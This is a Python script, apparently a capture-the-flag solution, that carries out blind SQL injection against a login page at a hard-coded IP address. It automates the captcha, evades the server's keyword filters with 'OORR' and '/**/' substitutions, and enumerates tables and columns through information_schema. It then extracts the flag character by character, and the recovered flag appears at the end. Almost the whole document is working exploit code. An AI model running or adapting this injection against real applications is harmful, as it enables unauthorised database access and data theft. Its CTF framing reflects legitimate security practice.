import requests
import base64

def sendPayload(username, password):
    username = username.replace(' ', '/**/').replace('OR', 'OORR').replace('or', 'oorr').replace('AND', 'AANDND').replace('and', 'anandd')
    
    with requests.Session() as sess:
        resp = sess.get('http://34.175.249.72:60001/scripts/captcha.php')
        captcha = resp.content[-13:-1]
        captcha = base64.b64decode(base64.b64decode(captcha))
        
        resp = sess.post(
            "http://34.175.249.72:60001/index.php",
            data={
                "username":username,
                "password":password,
                "captcha":captcha,
                "send":"Send"
            }
        )
        if b"Invalid username or password" in resp.content:
            return 0
        
        if b"Treasures are always in the database" in resp.content:
            return 1
        
        if b"statement error" in resp.content:
            print(resp.content)
            return 2


# Extract number of queried columns
"""
for i in range(1, 50):
    args = ['NULL' for i in range(i)]
    args = ','.join(args)
    if sendPayload("'OR 1=1 UNION SELECT "+args+" #", 'd') == 1:
        print(i)
        break

# Result: 5
"""

# Extract tables
"""
tables = [''] # Incomplete table names
total = []  # Complete table names

# Find the possible characters that can be added to the table name tables[0]. If no new characters were found, means the name is complete & can be inserted in total else update tables list.
while len(tables) != 0:
    table = tables[0]
    possibles = []
    for c in "azertyuiopmlkjhgfdsqwxcvbn.,0123456789":
        if 1 == sendPayload("' UNION SELECT table_name, NULL, NULL, NULL, NULL FROM information_schema.tables where table_name like '"+table+c+"%' LIMIT 1#", 'd'):
            possibles.append(c)
    if len(possibles) != 1:
        del tables[0]
        for poss in possibles:
            tables.append(table+poss)
        if len(possibles) == 0:
            total.append(table)
    else:
        tables[0] = table + possibles[0]
    
    print('tables:', tables)
    print('total:', total)

"""

# Extract columns
"""
cols = ['']
total_cols = []
table_name = ''
while len(tables) != 0:
    col = cols[0]
    possibles = []
    for c in "azertyuiopmlkjhgfdsqwxcvbn.,0123456789":
        if 1 == sendPayload("' UNION SELECT column_name, NULL, NULL, NULL, NULL FROM information_schema.columns where table_name='"+table_name+"' and column_name like '"+col+c+"%' LIMIT 1#", 'd'):
            possibles.append(c)
    if len(possibles) != 1:
        del cols[0]
        for poss in possibles:
            cols.append(col+poss)
        if len(possibles) == 0:
            total_cols.append(col)
    else:
        cols[0] = col + possibles[0]
    
    print(cols)
    print('total', total_cols)
"""


# Final stage, extract the flag
"""
rows = [""]
total_rows = []

while len(rows) != 0:
    row = rows[0]
    possibles = []
    for c in "$#_{-}?!:;-*/+@AZERTYUIOPMLKJHGFDSQWXCVBNazertyuiopmlkjhgfdsqwxcvbn0123456789.,":
        if 1 == sendPayload("' UNION SELECT flag, NULL, NULL, NULL, NULL FROM solve where ASCII(substr(flag,"+str(1+len(rows[0]))+",1)) = ascii('"+c+"') LIMIT 1#", 'd'):
            possibles.append(c)
            break # Only 1 row so don't bother
    
    if len(possibles) != 1:
        del rows[0]
        for poss in possibles:
            rows.append(row+poss)
        if len(possibles) == 0:
            total_rows.append(row)
    else:
        rows[0] = row + possibles[0]
    
    print('rows:', rows)
    print('total:', total_rows)
"""

# ASCWG{23fsdc$@#EAScasq12_hard}